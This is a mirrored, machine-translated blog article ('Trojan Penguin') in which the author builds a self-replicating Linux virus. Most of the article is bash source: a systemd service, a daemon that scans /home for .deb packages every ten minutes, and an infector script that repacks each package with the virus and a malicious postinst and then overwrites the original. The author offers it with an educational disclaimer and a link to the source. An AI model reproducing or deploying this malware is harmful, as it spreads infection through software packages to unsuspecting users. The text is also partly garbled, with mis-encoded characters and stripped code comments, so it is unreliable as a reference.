<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üßõüèæ üëâüèæ üöª Trojan Penguin: Criando um v√≠rus para Linux üåó üç£ üèá</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="N√£o, n√£o vou contar como escrever meu ransomware ransomware, minerador ou explorar uma vulnerabilidade super nova, como voc√™ pode imaginar. E ainda ma...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Trojan Penguin: Criando um v√≠rus para Linux</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/430460/">  N√£o, n√£o vou contar como escrever meu ransomware ransomware, minerador ou explorar uma vulnerabilidade super nova, como voc√™ pode imaginar.  E ainda mais, n√£o estou ansioso para aumentar o holivar "O Linux √© mais seguro que o Windows? (Sim)".  Meu objetivo era escrever um v√≠rus simples para o linux, ningu√©m, por assim dizer, "Just for Fun", cuja √∫nica fun√ß√£o √© distribuir sua c√≥pia.  Sobre o que fiz, vou contar neste artigo.  No final, darei um link para o GitHub com a fonte. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/f5e/05a/703/f5e05a7031834bc8fb94b82b25429f68.jpg" alt="imagem"><br><a name="habracut"></a><br><h4>  Isen√ß√£o de responsabilidade </h4><br>  Este artigo foi escrito para fins educacionais.  O autor em nenhum caso incentiva os leitores a violar as leis da Federa√ß√£o Russa.  Por favor, n√£o repita as etapas descritas neste artigo sem ler primeiro o cap√≠tulo 28 do C√≥digo Penal da Federa√ß√£o Russa. <br><br><h4>  E o que vamos realmente fazer? </h4><br>  O mecanismo de implementa√ß√£o mais f√°cil para espalhar o v√≠rus me pareceu se espalhar atrav√©s de pacotes deb / rpm modificados.  Os pacotes deb e rpm agora s√£o a ferramenta de distribui√ß√£o mais popular para Linux.  Optei pelo deb, pois o n√∫mero de usu√°rios de distribui√ß√µes baseadas no Debian prevalece sobre os usu√°rios do Red Hat e seus "seguidores". <br><br>  Tamb√©m √© necess√°rio que o v√≠rus inicie automaticamente e, ap√≥s determinado per√≠odo de tempo, verifique o computador em busca de pacotes deb.  Para facilitar a depura√ß√£o, escolhi um per√≠odo de 10 minutos. <br><br><h4>  O que √© um pacote deb? </h4><br>  O pacote deb √© um arquivo no formato <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">.ar</a> que n√£o usa compacta√ß√£o.  Existem mais tr√™s arquivos dentro do arquivo: <i>debian-bynary</i> , <i>control.tar</i> e <i>data.tar</i> <br><br>  <i>debian.binary</i> - um arquivo de texto contendo uma vers√£o do formato do pacote deb, no momento em que eles sempre escrevem "2.0" l√°. <br><br>  <i>control.tar</i> - arquiva com arquivos contendo informa√ß√µes sobre o pacote (por exemplo, o arquivo de controle necess√°rio) e pacotes necess√°rios para instalar o pacote (por exemplo, scripts pr√©inst, postinst, prerm e postrm que s√£o executados antes / depois da instala√ß√£o / desinstala√ß√£o do pacote).  Ele pode ser compactado usando gzip ou xz. Nesse caso, a extens√£o .gz ou .xz √© adicionada ao nome do arquivo, respectivamente. <br><br>  <i>data.tar</i> - arquive com diret√≥rios que cont√™m arquivos instalados.  Os diret√≥rios s√£o representados por uma √°rvore, na forma em que devem ser extra√≠dos para a raiz do sistema de arquivos.  Pode ser compactado usando gzip, bzip2, lzma, xz. <br><br>  Precisamos prestar aten√ß√£o ao arquivo de controle do arquivo control.tar.  Este arquivo cont√©m informa√ß√µes sobre o pacote, como autor, descri√ß√£o, vers√£o, prioridade do pacote no sistema, etc. Estou interessado no campo <i>depende</i> , que mostra as depend√™ncias (pacotes sem os quais ele n√£o pode funcionar neste pacote).  Nesse campo, nosso v√≠rus anexar√° o <i>fakeroot</i> e o <i>dpkg</i> - utilit√°rios necess√°rios para modificar outros pacotes no computador infectado. <br><br>  Para construir um pacote deb, o diret√≥rio raiz do pacote √© criado.  Diret√≥rios com arquivos instalados e o diret√≥rio DEBIAN contendo arquivos de servi√ßo, incluindo controle e scripts para instala√ß√£o / desinstala√ß√£o, s√£o colocados nele.  Em seguida, o <i>comando fakeroot dpkg-deb --build ./path √© executado</i> . <br><br><h4>  Primeiro houve um dem√¥nio </h4><br>  No momento em que escrevi o v√≠rus, eu ainda tinha uma p√©ssima id√©ia do que <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">era Cron</a> e, por isso, escrevi meu pr√≥prio daemon para <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">systemd</a> .  Criei o arquivo trojan_penguin.service, que ser√° colocado no diret√≥rio / lib / systemd / system e adicionei o seguinte: <br><br><pre><code class="bash hljs">[Unit] Description = XXX [Service] ExecStart=/usr/bin/trojan_penguin.sh Type=fork [Install] WantedBy=multi-user.target</code> </pre> <br>  <i>ExecStart = / usr / bin / trojan_penguin.sh</i> - aqui indiquei o caminho para o arquivo (para o futuro v√≠rus), que deve ser iniciado na inicializa√ß√£o do sistema. <br><br>  <i>Tipo = bifurca√ß√£o</i> - esta linha indica que o processo deve se ramificar do processo pai. <br>  N√£o vi a necessidade de um arquivo PID, portanto n√£o o adicionei. <br><blockquote>  Nos manuais para escrever seu pr√≥prio daemon, os arquivos .service s√£o propostos para serem colocados nos diret√≥rios / usr / lib / systemd / system / ou / etc / systemd / system /.  Mas no meu ubunt eu encontrei o diret√≥rio / lib / systemd / system.  (Eu tenho o apache2.service l√°).  Talvez algu√©m nos coment√°rios escreva para que serve esse diret√≥rio e como ele difere dos outros dois. </blockquote><br>  O arquivo <i>/usr/bin/trojan_penguin.sh</i> recebi isso: <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/bash #debug=".../Programming/projects/TrojanPenguin" debug="" #    ,    if ! [ -d $debug/var/log/trojan_penguin/ ]; then mkdir $debug/var/log/trojan_penguin fi #   , #   10  while [ 1 ] do list=$(find /home -name "*.deb") # deb- #        for line in $list do $debug/usr/bin/tp_infect.sh $line &gt;&gt; $debug/var/log/trojan_penguin/log # ,  ,      log done date &gt; $debug/var/log/trojan_penguin/last_start #     (     ) sleep 600 # (60 * 10  = 10 ) done</span></span></code> </pre><br>  Estamos procurando pacotes deb na se√ß√£o / home (onde mais posso encontr√°-los?). Os caminhos para os arquivos encontrados s√£o gravados na vari√°vel <i>list</i> .  Em seguida, basta percorrer todas as linhas da linha e, para cada arquivo, executamos o script tp_infect.sh, que infectar√° esse arquivo.  Quando escrevi o v√≠rus, os scripts estavam em um diret√≥rio separado e, por conveni√™ncia, criei uma vari√°vel de <i>depura√ß√£o</i> na qual escrevi o caminho para esta pasta. <br><br>  O daemon est√° pronto, resta saber como execut√°-lo quando o sistema iniciar.  Para isso, escrevi um script <i>p√≥s-instala√ß√£o</i> .  Ele ser√° iniciado imediatamente ap√≥s a instala√ß√£o do pacote infectado e indica que nosso v√≠rus come√ßa com o sistema.  Coloquei-o no diret√≥rio "/ usr / bin /" para copi√°-lo de l√° para os pacotes infectados. <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/bash #debug="/home/dima/Dropbox/Programming/projects/TrojanPenguin/TrojanPenguin" debug="" systemctl daemon-reload #  ,           systemctl enable trojan_penguin.service #     systemctl start trojan_penguin.service # </span></span></code> </pre><br><h4>  Modificando o pacote deb </h4><br>  Como escrevi acima, os arquivos contidos em um pacote deb podem ter permiss√µes diferentes.  Eu n√£o me incomodei e considerei apenas o caso em que os arquivos s√£o compactados usando .xz.  O arquivo <i>/usr/bin/tp_infect.sh</i> respons√°vel pela modifica√ß√£o recebeu o seguinte conte√∫do: <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/bash #debug=".../Programming/projects/TrojanPenguin" debug="" temp="$debug/tmp/trojan_penguin" #   mkdir $temp mkdir $temp/new mkdir $temp/new/DEBIAN #  ar -p $1 data.tar.xz | tar -xJ -C $temp/new ar -p $1 control.tar.xz | tar -xJ -C $temp/new/DEBIAN/ # control #  control     "Deepends",    "Deepends",   ,     . cp $temp/new/DEBIAN/control $temp/orig_control cat $temp/orig_control | grep --before-context=100 Depends | grep -v Depends &gt; $temp/new/DEBIAN/control cat $temp/orig_control | grep Depends | tr -d '\r\n' &gt;&gt; $temp/new/DEBIAN/control echo ", fakeroot, python" &gt;&gt; $temp/new/DEBIAN/control cat $temp/orig_control | grep --after-context=100 Depends | grep -v Depends &gt;&gt; $temp/new/DEBIAN/control #    cp $debug/usr/bin/tp_postinst.sh $temp/new/DEBIAN/postinst #     ,    if ! [ -d $temp/new/usr ]; then mkdir $temp/new/usr fi if ! [ -d $temp/new/usr/bin ]; then mkdir $temp/new/usr/bin fi if ! [ -d $temp/new/lib ]; then mkdir $temp/new/lib fi if ! [ -d $temp/new/lib/systemd ]; then mkdir $temp/new/lib/systemd fi if ! [ -d $temp/new/lib/systemd/system ]; then mkdir $temp/new/lib/systemd/system fi #   cp $debug/usr/bin/trojan_penguin.sh $temp/new/usr/bin/trojan_penguin.sh cp $debug/usr/bin/tp_infect.sh $temp/new/usr/bin/tp_infect.sh cp $debug/usr/bin/tp_postinst.sh $temp/new/usr/bin/tp_postinst.sh cp $debug/lib/systemd/system/trojan_penguin.service $temp/new/lib/systemd/system/ # ,        ,    . fakeroot dpkg-deb --build $temp/new cp $temp/new.deb $1 rm -R $temp</span></span></code> </pre><br><h4>  Problemas com a p√≥s-instala√ß√£o </h4><br>  Tudo ficaria bem, mas agora temos um problema.  Mas e se o pacote j√° tiver postinstal?  A p√≥s-instala√ß√£o original pode ser escrita em diferentes idiomas (python, bash ...), talvez seja at√© bin√°ria.  Isso n√£o nos permitir√° simplesmente pegar e adicionar nosso postinstall.  Resolvi esse problema da seguinte maneira: <br><br>  Adicionado o seguinte ao script <i>tp_infect.sh</i> : <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#,     postinstal.  ,      . if [ -f $temp/new/usr/bin/postinst ]; then cp $temp/new/DEBIAN/postinst $debug/usr/bin/tp_orig_postinst fi</span></span></code> </pre><br>  E na <i>p√≥s-instala√ß√£o</i> , √© o seguinte: <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#      if [ -f $debug/usr/bin/tp_orig_postinst ]; then $debug/usr/bin/tp_orig_postinst rm $debug/usr/bin/tp_orig_postinst fi</span></span></code> </pre><br>  Eu resolvi um problema, mas outro apareceu.  Nosso v√≠rus modificar√° o pacote, mesmo que j√° esteja infectado.  Ap√≥s a modifica√ß√£o, o v√≠rus ver√° que existe uma <i>p√≥s-instala√ß√£o</i> no pacote (que √© realmente nosso), mova-o para / usr / bin /, substituindo assim o original.  Para evitar isso, adicionei uma verifica√ß√£o ao "tp_infect.sh", independentemente de termos modificado ou n√£o este arquivo: <br><br><pre> <code class="bash hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> [ -f <span class="hljs-variable"><span class="hljs-variable">$temp</span></span>/new/usr/bin/trojan_penguin.sh ]; <span class="hljs-keyword"><span class="hljs-keyword">then</span></span> rm -R <span class="hljs-variable"><span class="hljs-variable">$temp</span></span> <span class="hljs-built_in"><span class="hljs-built_in">exit</span></span> 0 <span class="hljs-keyword"><span class="hljs-keyword">fi</span></span></code> </pre><br><h4>  Juntando </h4><br>  O v√≠rus est√° pronto.  Aqui est√° um <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">link para o GitHub</a> , como prometido.  Este v√≠rus pode ser compilado em um pacote deb separado (execute makedeb.sh) do reposit√≥rio.  Para injetar o v√≠rus em qualquer pacote, basta executar o comando: <br><br><pre> <code class="bash hljs">tp_infect.sh /  deb-/</code> </pre><br>  Existem duas c√≥pias do script <i>postinst</i> no reposit√≥rio <br><br>  <i>DEBIAN / postinst</i> - esta c√≥pia √© executada apenas ao instalar um pacote vazio com um v√≠rus.  Comentei para que o v√≠rus n√£o inicie ap√≥s a instala√ß√£o e modifique os pacotes apenas por comando. <br><br>  <i>usr / bin / postinst</i> - esta c√≥pia √© inserida nos pacotes infectados. <br><br><h4>  Sum√°rio </h4><br>  E a conclus√£o √© √≥bvia sem este artigo: voc√™ n√£o deve baixar e executar programas de fontes n√£o verificadas. <br><br>  Por uma quest√£o de curiosidade, enviei o pacote deb do v√≠rus ao VirusTotal para an√°lise.  No momento da reda√ß√£o deste documento, nenhum antiv√≠rus o detectou.  Aqui est√° o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">link</a> para o relat√≥rio.  Gostaria de saber quanto tempo deve passar e quantos hosts precisam ser infectados com esse v√≠rus, para que os antiv√≠rus prestem aten√ß√£o a ele? </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt430460/">https://habr.com/ru/post/pt430460/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt430450/index.html">Modelo de desenvolvimento usando CPU baseada em pilha como exemplo</a></li>
<li><a href="../pt430452/index.html">Fogo, √°gua e spray fino. Como os moradores e visitantes do Centro de Lakhta ser√£o protegidos do fogo</a></li>
<li><a href="../pt430454/index.html">Estou cercado por idiotas ou como trabalhar em equipe</a></li>
<li><a href="../pt430456/index.html">Livros de Gerenciamento de Projetos Legais do PMI</a></li>
<li><a href="../pt430458/index.html">Supercondutor de grafeno multicamada: investiga√ß√£o de zonas planas</a></li>
<li><a href="../pt430462/index.html">Na R√∫ssia, apareceu uma lei sobre o fornecimento de dados de usu√°rios de redes sociais para um c√≠rculo ilimitado de pessoas. Redes sociais contra</a></li>
<li><a href="../pt430466/index.html">Mini AI Cup # 3: Escrevendo um Top Bot</a></li>
<li><a href="../pt430468/index.html">Sensibilizar os cidad√£os</a></li>
<li><a href="../pt430470/index.html">Por que manter o contexto na conta do cliente - de maneira honesta e lucrativa</a></li>
<li><a href="../pt430472/index.html">Rede DECT sem costura DIY</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>